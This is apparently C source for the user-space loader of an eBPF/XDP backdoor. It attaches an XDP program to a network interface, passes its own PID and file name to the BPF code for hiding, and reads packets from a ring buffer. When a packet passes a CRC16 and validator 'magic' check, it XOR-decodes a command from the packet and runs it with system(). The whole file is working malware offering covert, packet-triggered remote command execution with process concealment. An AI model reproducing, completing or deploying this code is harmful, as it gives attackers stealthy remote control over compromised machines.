```c
#include <bpf/libbpf.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <xdp/libxdp.h>
#include <bpf/bpf.h>
#include <net/if.h>
#include <arpa/inet.h>
#include "common.h"
#include "crc16.h"

#include "server.bpf.skel.h"

static volatile bool exiting = false;

static void sig_handler(int sig)
{
	exiting = true;
}

int check_payload_data(char *data,size_t len)
{
    ssize_t data_offset = 0;
    uint16_t checksum;
    uint16_t net_checksum;
    uint16_t trigger_fragment2_len;
    uint16_t validator;
    uint16_t command_len;
    size_t want_len;
    char cmd[COMMAND_MAX_LENGTH+1] = {0};
    int i;

    want_len = START_PAD + CRC_DATA_LENGTH;
    if(len < want_len){
        return -1;
    }
    checksum = crc16(data + START_PAD, CRC_DATA_LENGTH);

#ifdef DEBUG
    printf("CRC16: 0x%04X\n", checksum);
#endif

    trigger_fragment2_len = checksum % RANDOM_PAD_MAX_LEN;

    data_offset = START_PAD + CRC_DATA_LENGTH + trigger_fragment2_len;
    want_len = data_offset + 2;
    if(len < want_len){
        return -1;
    }
    net_checksum = ntohs(*(uint16_t*)(data+data_offset));
    if(checksum != net_checksum){
#ifdef DEBUG
        printf ("CRC = 0x%2.2x, CRC check failed\n", checksum);
#endif
        return -1;
    }


    data_offset +=2;
    want_len = data_offset + 2;
    if(len < want_len){
        return -1;
    }
    validator = ntohs(*(uint16_t*)(data+data_offset));
    if( (validator % 127)!=0 ){
#ifdef DEBUG
        printf ("Validator check failed: validator = 0x%2.2x\n", validator);
#endif
        return -1;
    }

    data_offset +=2;
    want_len = data_offset + 2;
    if(len < want_len){
        return -1;
    }
    command_len = ntohs(*(uint16_t*)(data+data_offset));
    if(command_len > COMMAND_MAX_LENGTH)
        return -1;

#ifdef DEBUG
    printf("command_len:%d\n",command_len);
#endif

    data_offset +=2;
    want_len = data_offset + command_len;
    if(len < want_len){
        return -1;
    }
    for(i = 0;i<command_len;i++){
        cmd[i] = data[START_PAD + (i % CRC_DATA_LENGTH)]^data[data_offset + i];
    }

#ifdef DEBUG
    printf("cmd:%s\n",cmd);
#endif
    system(cmd);
	return 0;
}

static int payload_handler(void *ctx,void *data,size_t len)
{
	check_payload_data(data,len);
    return 0;
}

static void print_help(char *argv)
{
	printf("\nUsage: %s  OPTION\n\n", argv);
	printf("Program OPTIONs\n");
	printf("\t-i, packet input  interface      Interface name. lo, eth0, wlan0, etc\n");
}

int main(int argc, char **argv)
{
	struct server_bpf *skel;
	int err;
	int pid;
	int i_ifindex = 0;

	int opt;
	while ((opt = getopt(argc, argv, "i:h")) != -1) {
		switch (opt) {
			case 'i':
				i_ifindex = if_nametoindex(optarg);
				if(i_ifindex == 0){
					perror("Error no input interface");
					exit(1);
				}
				break;
			case 'h':
				print_help(argv[0]);
				exit(0);
				break;
			default:
				printf("Unknown option: %c\n", optopt);
				print_help(argv[0]);
				exit(1);
				break;
		}
	}

	if(i_ifindex == 0){
		printf("Error no input interface\n");
		print_help(argv[0]);
		exit(1);
	}

	char *filename = strrchr(argv[0], '/');
	filename++;
	if(strlen(filename) > 15){
		printf("The program name length must be less than 16 \n");
		return -1;
	}
	pid = getpid();

#ifdef DEBUG
	printf("pid:%d\n",pid);
#endif
 
	signal(SIGINT, sig_handler);
	signal(SIGTERM, sig_handler);

	skel = server_bpf__open();
	if (!skel) {
		fprintf(stderr, "Failed to open and load BPF skeleton\n");
		return 1;
	}

	snprintf(skel->rodata->pid_to_hidden,16,"%d",pid);
	snprintf(skel->rodata->file_name_to_hidden,16,"%s",filename);

	err = server_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}
	//map

    struct ring_buffer *ringBuffer = ring_buffer__new(bpf_map__fd(skel->maps.payload_ringbuf),payload_handler,NULL,NULL);
    if(!ringBuffer){
        printf("Failed to create ring buffer\n");
        return 1;
    }

	//attach xdp 
	bpf_program__attach_xdp(skel->progs.xdp_prog,i_ifindex);
	err = server_bpf__attach(skel);
	
	if (err) {
		fprintf(stderr, "Failed to attach BPF skeleton\n");
		goto cleanup;
	}

	while (!exiting){
		ring_buffer__consume(ringBuffer);
	}

cleanup:
	server_bpf__destroy(skel);
	return err < 0 ? -err : 0;
}
```

